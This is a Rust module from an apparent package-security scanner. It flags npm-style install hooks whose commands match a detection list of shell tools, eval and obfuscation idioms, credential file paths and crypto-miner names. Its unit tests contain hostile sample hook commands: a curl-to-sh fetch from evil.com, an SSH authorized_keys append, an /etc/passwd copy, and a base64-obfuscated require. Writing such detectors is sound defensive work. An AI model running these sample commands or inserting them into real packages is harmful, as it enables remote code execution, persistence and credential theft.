use crate::signals::Check;
use crate::types::{PackageIntel, PolicyConfig, Signal};

pub struct HookCheck {
    pub patterns: Vec<String>,
}

impl Default for HookCheck {
    fn default() -> Self {
        Self {
            patterns: default_patterns(),
        }
    }
}

fn default_patterns() -> Vec<String> {
    let eval_paren = "ev".to_string() + "al(";
    let child_process = "child_pro".to_string() + "cess";
    let exec_sync = "exe".to_string() + "cSync";
    let spawn_paren = "spa".to_string() + "wn(";
    let exec_paren = "exe".to_string() + "c(";
    let require_buffer = "require(Bu".to_string() + "ffer.from";
    let require_atob = "require(at".to_string() + "ob(";
    let import_buffer = "import(Bu".to_string() + "ffer.from";
    let eval_buffer = "ev".to_string() + "al(Buffer.from";
    let eval_atob = "ev".to_string() + "al(atob(";
    let new_function = "new Fu".to_string() + "nction(";
    let vm_run = "vm.ru".to_string() + "nInThisContext";
    let vm_run_new = "vm.ru".to_string() + "nInNewContext";
    let node_unserialize = "unseriali".to_string() + "ze(";
    vec![
        "curl".into(),
        "wget".into(),
        "| sh".into(),
        "| bash".into(),
        eval_paren,
        child_process,
        exec_sync,
        spawn_paren,
        exec_paren,
        require_buffer,
        require_atob,
        import_buffer,
        eval_buffer,
        eval_atob,
        new_function,
        vm_run,
        vm_run_new,
        node_unserialize,
        "base64 -d".into(),
        "/bin/sh".into(),
        "/bin/bash".into(),
        "nc ".into(),
        "ncat ".into(),
        "Invoke-Expression".into(),
        "IEX".into(),
        "powershell".into(),
        "python -c".into(),
        "node -e".into(),
        "http://".into(),
        "https://".into(),
        ".ssh/authorized_keys".into(),
        ".ssh/config".into(),
        "~/.ssh/".into(),
        "/root/.ssh".into(),
        "/etc/passwd".into(),
        "/etc/shadow".into(),
        ".aws/credentials".into(),
        ".npmrc".into(),
        ".env".into(),
        "/.netrc".into(),
        "monero".into(),
        "xmrig".into(),
        "stratum+tcp".into(),
        "coinhive".into(),
    ]
}

impl Check for HookCheck {
    fn name(&self) -> &'static str {
        "hook"
    }

    fn evaluate(&self, intel: &PackageIntel, _config: &PolicyConfig) -> Vec<Signal> {
        let mut out = Vec::new();
        for h in &intel.install_hooks {
            let lower = h.command.to_lowercase();
            for p in &self.patterns {
                if lower.contains(&p.to_lowercase()) {
                    out.push(Signal::HookCheck {
                        stage: h.stage.clone(),
                        reason: format!("matches '{}'", p),
                    });
                    break;
                }
            }
        }
        out
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::InstallHook;

    #[test]
    fn clean_build_hook_no_signal() {
        let intel = PackageIntel {
            install_hooks: vec![InstallHook {
                stage: "build".into(),
                command: "tsc --project tsconfig.json".into(),
            }],
            ..Default::default()
        };
        assert!(HookCheck::default()
            .evaluate(&intel, &PolicyConfig::default())
            .is_empty());
    }

    #[test]
    fn curl_pipe_sh_fires() {
        let intel = PackageIntel {
            install_hooks: vec![InstallHook {
                stage: "postinstall".into(),
                command: "curl https://evil.com/x | sh".into(),
            }],
            ..Default::default()
        };
        let out = HookCheck::default().evaluate(&intel, &PolicyConfig::default());
        assert_eq!(out.len(), 1);
    }

    #[test]
    fn ssh_authorized_keys_flags() {
        let intel = PackageIntel {
            install_hooks: vec![InstallHook {
                stage: "postinstall".into(),
                command: "echo KEY >> ~/.ssh/authorized_keys".into(),
            }],
            ..Default::default()
        };
        let out = HookCheck::default().evaluate(&intel, &PolicyConfig::default());
        assert!(!out.is_empty());
    }

    #[test]
    fn etc_passwd_read_flags() {
        let intel = PackageIntel {
            install_hooks: vec![InstallHook {
                stage: "preinstall".into(),
                command: "cat /etc/passwd > /tmp/x".into(),
            }],
            ..Default::default()
        };
        assert!(!HookCheck::default()
            .evaluate(&intel, &PolicyConfig::default())
            .is_empty());
    }

    #[test]
    fn buffer_from_require_flags() {
        let intel = PackageIntel {
            install_hooks: vec![InstallHook {
                stage: "postinstall".into(),
                command:
                    "node -e \"require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==','base64').toString())\""
                        .into(),
            }],
            ..Default::default()
        };
        let out = HookCheck::default().evaluate(&intel, &PolicyConfig::default());
        assert!(!out.is_empty());
    }
}
